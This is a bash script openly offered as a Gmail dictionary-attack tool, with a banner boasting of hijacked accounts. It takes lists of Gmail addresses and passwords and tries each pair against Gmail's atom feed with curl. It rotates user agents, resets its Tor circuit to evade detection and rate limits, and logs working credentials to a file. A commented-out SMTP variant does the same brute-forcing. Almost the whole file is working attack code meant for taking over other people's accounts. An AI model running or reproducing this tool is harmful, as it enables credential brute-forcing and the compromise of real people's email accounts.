#!/bin/bash

# Gmail Account Checker
# Issued on 27/12/2018
# © Copyright ~ 4WSec
# Don't Delete Copyright, Bitch!

# Color
PP='\033[95m' # purple
CY='\033[96m' # cyan
BL='\033[94m' # blue
GR='\033[92m' # green
YW='\033[93m' # yellow
RD='\033[91m' # red
NT='\033[97m' # netral
O='\e[0m' # nothing
B='\e[5m' # blink
U='\e[4m' # underline


# Date
time=`date "+%d_%m_%Y"`

# Ratio
sl33p=5
con=1
threads=7

clear

# User Agents
useragents=("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0" "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201" "Mozilla/5.0 (Windows; U; Windows NT 6.1; it; rv:2.0b4) Gecko/20100818" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.1) Gecko/2008070206" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.4) Gecko/20061201 Mozilla/5.0 (Linux Mint)" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7b) Gecko/20040429" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.353.0 Safari/533.3" "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9" "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5" "Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.1) Gecko/20020925" "Mozilla/5.001 (Macintosh; N; PPC; ja) Gecko/25250101" "Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.0.0) Gecko/20020615 Debian/1.0.0-3" "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52" "Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50" "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.51" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8a3) Gecko/20040817" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8a1) Gecko/20040520" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17" "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11" "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.51" "Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10" "Mozilla/5.0 (Windows NT 6.1; U; nl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01" "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.7.39 Version/11.00" "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.6.30 Version/10.61" "Opera/10.60 (Windows NT 5.1; U; en-US) Presto/2.6.30 Version/10.60" "Opera/9.80 (Windows NT 6.1; U; sk) Presto/2.6.22 Version/10.50" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.288.1 Safari/532.8" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE) Chrome/4.0.223.3 Safari/532.2" "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0" "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3b) Gecko/20021213" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.3a) Gecko/20021212" "Mozilla/5.0 (Windows; U; Windows NT 5.0; de-AT; rv:1.3.1) Gecko/20030425" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)" "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15" "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g" "Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)" "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179" "Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)" "SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)" "Mozilla/5.0 (PLAYSTATION 3; 3.55)" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0" "Opera/9.20 (Windows NT 6.0; U; en)" "Googlebot/2.1 (http://www.googlebot.com/bot.html)" "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)" "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)" "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4" "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)");

# Random User Agents
rand_ua=${useragents[$RANDOM % ${#useragents[@]}]}

# Dependencies
function chk_depen()
{
	clear
	if [[ -f "dependencies.conf" ]]; then
		sleep 1
	else
		printf "\t ${BL}[!] ${NT}Checking Guns ..........\n"
		echo ""
		touch dependencies.conf
		echo "# 4WSec Just Dropped Yo Gmail" >> dependencies.conf
		sleep 1
		curl -h > /dev/null 2>&1
		if [[ $? -eq 0 ]]; then
			printf "\t ${YW}cURL ${NT}.......... ${GR}[✔]\n"
			echo "curl = yes" >> dependencies.conf
		else
			printf "\t ${YW}cURL ${NT}.......... ${RD}[✘]\n"
			sleep 1
			apt-get install curl -y
		fi
		tor -h > /dev/null 2>&1
		if [[ $? -eq 0 ]]; then
			printf "\t ${YW}Tor ${NT}.......... ${GR}[✔]\n"
			echo "tor = yes" >> dependencies.conf
		else
			printf "\t ${YW}Tor ${NT}.......... ${RD}[✘]\n"
			sleep 1
			apt-get install tor -y
		fi
		sleep 5
		clear
	fi
}


function banner(){
	printf "
\t${GR}  _  _
\t | || | _
\t-| || || |
\t | || || |- ${RD}Your Gmail Has Been Hijacked (>'-')>${GR}
\t  \_  || |
\t    |  _/  ${BL}--=[ ${YW}${U}Multiple ${RD}Gmail ${GR}Dictionary ${PP}Attack${O}
\t${GR}   -| | \  ${BL}--=[ ${CY}${U}Author${O} : ${NT}4WSec
\t${GR}    |_|-   ${BL}--=[ ${CY}${U}Team${O}   : ${NT}Anon Cyber Team

                            ${RD}[ WARNING ]
${RD}[!] ${YW}Enable Less Secure Apps: myaccount.google.com/lesssecureapps

"
}


function chng_ip(){
	killall -HUP tor
}


function chk_tor(){
	tor=$(curl -socks5-hostname localhost:9050 -s https://check.torproject.org > /dev/null; echo $?);
	if [[ $tor -gt 0 ]]; then
		printf "${RD}[!] ${YW}Please, Check Your TOR Connection! \n"
		exit
	fi
}


#smtp method
#function smtpcheck(){
#	gtor
#	chng_ip
#	acc_chk=$(curl --socks5-hostname localhost:9050 --url 'smtps://smtp.gmail.com:465' --ssl-reqd --user "$1:$2" --insecure | grep -c "gsmtp")
#	if [[ $acc_chk == 1 ]]; then
#		printf "${GR}[✔] ${RD}Login Success :) [Email: ${GR}$us3rn4m3${RD}] ${RD}[Password: ${GR}$p4sswd${RD}]\n"
#	else
#		printf "${RD}[✘] ${YW}Login Failed :( [Email: ${NT}$us3rn4m3${YW}] [Password: ${NT}$p4sswd${YW}]\n"
#	fi
#}


function gcheck(){
	acc_chk=$(timeout 5 curl -s -A "${rand_ua}" "https://mail.google.com/mail/feed/atom" -u "$gm4il:$p4sswd");
	#use proxychains
	#acc_chk=$(proxychains curl -s "https://mail.google.com/mail/feed/atom" -u "$1:$2");
	if [[ $acc_chk =~ "Gmail - Inbox for" ]]; then
		printf "${GR}[✔] ${RD}Login Success :) [Email: ${GR}$gm4il${RD}] ${RD}[Password: ${GR}$p4sswd${RD}]\n"
		echo "$gm4il:$p4sswd" >> account_result_$time.txt
		chng_ip
	else
		printf "${RD}[✘] ${YW}Login Failed :( [Email: ${NT}$gm4il${YW}] [Password: ${NT}$p4sswd${YW}]\n"
	fi
}


function 4tt4ck(){
	chk_depen
	chk_tor
	banner
	printf "${PP}"
	read -p "Enter Gmail List: " gmailist;
	if [[ ! -e $gmailist ]]; then
		printf "${RD}[!] ${YW}File Not Found\n"
		exit 0
	fi
	read -p "Enter Password List: " passwdlist;
	if [[ ! -e $passwdlist ]]; then
		printf "${RD}[!] ${YW}File Not Found\n"
		exit 0
	fi
	echo ""

	for gm4il in $(cat $gmailist); do
		for p4sswd in $(cat $passwdlist); do
			fast=$(expr $con % $threads)
			if [[ $fast == 0 && $con > 0 ]]; then
				sleep $sl33p
				printf "\t${NT}Sleep for ${sl33p}s - Nyannn ${YW}/ᐠ｡ꞈ｡ᐟ❁\∫\n"
				chng_ip
			fi
			gcheck &
		done
	done
	wait
}
4tt4ck